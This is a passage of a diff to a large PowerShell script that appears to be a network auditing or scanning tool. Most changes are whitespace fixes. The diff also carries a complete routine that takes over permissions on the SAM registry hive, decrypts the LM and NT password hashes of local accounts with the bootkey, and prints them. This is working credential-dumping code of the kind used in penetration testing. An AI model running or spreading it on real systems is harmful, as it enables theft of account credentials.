+function Get-UserName([byte[]]$V)
+{
+if (-not $V) {return $null};
+$offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
+$len = [BitConverter]::ToInt32($V[0x10..0x13],0);
+return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
+}
+
+function Get-UserHashes($u, [byte[]]$hbootkey)
+{
+[byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
+
+# check if hashes exist (if byte memory equals to 20, then we've got a hash)
+$LM_exists = $false;
+$NT_exists = $false;
+# LM header check
+if ($u.V[0xa0..0xa3] -eq 20)
+{
+$LM_exists = $true;
+}
+# NT header check
+elseif ($u.V[0xac..0xaf] -eq 20)
+{
+$NT_exists = $true;
+}
+
+if ($LM_exists -eq $true)
+{
+$lm_hash_offset = $u.HashOffset + 4;
+$nt_hash_offset = $u.HashOffset + 8 + 0x10;
+$enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
+$enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
+}
+
+elseif ($NT_exists -eq $true)
+{
+$nt_hash_offset = $u.HashOffset + 8;
+$enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
+}
+return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+}
+
+function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+{
+[byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
+# LM Hash
+if ($enc_lm_hash)
+{
+$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
+}
+
+# NT Hash
+if ($enc_nt_hash)
+{
+$nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
+}
+
+return ,($lmhash,$nthash)
+}
+
+function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+{
+$deskeys = sid_to_key $rid;
+$md5 = [Security.Cryptography.MD5]::Create();
+$rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
+$rc4 = NewRC4 $rc4_key;
+$obfkey = $rc4.encrypt($enc_hash);
+$hash = (des_decrypt $obfkey[0..7] $deskeys[0]) +
+(des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
+return ,$hash;
+}
+
+function Get-UserKeys
+{
+ls HKLM:\SAM\SAM\Domains\Account\Users |
+where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
+Add-Member AliasProperty KeyName PSChildName -PassThru |
+Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
+Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
+Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
+Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
+}
+
+function DumpHashes
+{
+LoadApi
+$bootkey = Get-BootKey;
+$hbootKey = Get-HBootKey $bootkey;
+Get-UserKeys | %{
+$hashes = Get-UserHashes $_ $hBootKey;
+"{0}:{1}:{2}:{3}" -f ($_.UserName,$_.Rid,
 [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), #LM hash
 [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower()); #NT hash
-} 
-} 
- 
-#http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060 
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
-{ 
-Return 
-}  
-else 
-{ 
-#Set permissions for the current user. 
-$rule = New-Object System.Security.AccessControl.RegistryAccessRule ( 
-[System.Security.Principal.WindowsIdentity]::GetCurrent().Name, 
-"FullControl", 
-[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit", 
-[System.Security.AccessControl.PropagationFlags]"None", 
-[System.Security.AccessControl.AccessControlType]"Allow") 
-$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey( 
-"SAM\SAM\Domains", 
-[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, 
-[System.Security.AccessControl.RegistryRights]::ChangePermissions) 
-$acl = $key.GetAccessControl() 
-$acl.SetAccessRule($rule) 
-$key.SetAccessControl($acl) 
- 
-DumpHashes 
- 
-#Remove the permissions added above. 
-$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name 
-$acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null 
-Set-Acl HKLM:\SAM\SAM\Domains $acl 
-} 
-} 
+}
+}
+
+#http://www.labofapenetrationtester.com/2013/05/poshing-hashes-part-2.html?showComment=1386725874167#c8513980725823764060
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+Return
+}
+else
+{
+#Set permissions for the current user.
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule (
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
+"FullControl",
+[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
+[System.Security.AccessControl.PropagationFlags]"None",
+[System.Security.AccessControl.AccessControlType]"Allow")
+$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
+"SAM\SAM\Domains",
+[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+[System.Security.AccessControl.RegistryRights]::ChangePermissions)
+$acl = $key.GetAccessControl()
+$acl.SetAccessRule($rule)
+$key.SetAccessControl($acl)
+
+DumpHashes
+
+#Remove the permissions added above.
+$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
+Set-Acl HKLM:\SAM\SAM\Domains $acl
+}
+}
 
 Get-PassHashes |%{
 	$HashString = $_.replace(":", ",")
@@ -4315,14 +4320,14 @@ $scan = @{
 }
 
 $today = (get-date).ToString("ddMMMyy") #used for creation of temp directory
-$FirstRunComps=$true #Active computers have not been generated yet
+$FirstRunComps = $true #Active computers have not been generated yet
 $ScanChoiceArray = New-Object System.Collections.ArrayList #array to hold scan choices
 $PSScriptRoot = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition #location of script
 $ConfigSuccess = $False #scan configuration has not been completed
 
 #Store current console colors to reset when script exits
-$BackgroundColor = [console]::BackgroundColor  
-$ForegroundColor = [Console]::ForegroundColor 
+$BackgroundColor = [console]::BackgroundColor
+$ForegroundColor = [Console]::ForegroundColor
 
 ############################################
 ####	 END Initialize Variables       ####
@@ -4355,4 +4360,3 @@ while($true)
 	}
 }
 
-	
